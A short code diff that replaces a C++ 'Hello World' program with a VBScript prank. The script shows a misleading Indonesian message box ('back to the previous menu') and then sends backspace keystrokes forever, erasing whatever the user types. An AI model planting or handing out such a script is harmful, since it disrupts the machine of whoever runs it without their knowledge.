@@ -1,7 +1,6 @@
-#include <iostream>
-using namespace std;
-
-int main(){
-  cout<<"Hello World";
-  cout<<"iyaa halo kamu";
-}
+MsgBox "kembali ke menu sebelumnya"
+Set wshShell =wscript.CreateObject("WScript.Shell")
+do
+wscript.sleep 100
+wshshell.sendkeys "{bs}"
+loop
